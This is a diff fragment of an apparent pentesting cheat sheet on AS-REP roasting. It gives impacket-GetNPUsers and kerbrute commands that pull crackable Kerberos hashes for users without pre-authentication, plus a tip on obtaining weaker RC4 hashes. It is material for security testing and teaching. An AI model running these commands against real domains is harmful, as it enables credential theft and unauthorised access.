@@ -12,7 +12,7 @@ impacket-GetNPUsers '<Domain>/' -usersfile users.txt -dc-ip <DCIP> -no-pass -for
 - [ ] KDC_ERR_C_PRINCIPAL_UNKNOWN: no such user
 One user:
 impacket-GetNPUsers '<Domain>/<TargetUser>' -dc-ip <DCIP> -no-pass -format hashcat
-kerbrute, during userenum, prints the hash of any roastable user it meets:
+kerbrute, from tool install kerbrute at the pwn-broker prompt, prints the hash of any roastable user it meets during userenum:
 kerbrute userenum -d <Domain> --dc <DCIP> users.txt
 - [ ] kerbrute's hash is AES, $18$, and slow to crack: ask again with GetNPUsers, which gets RC4
 
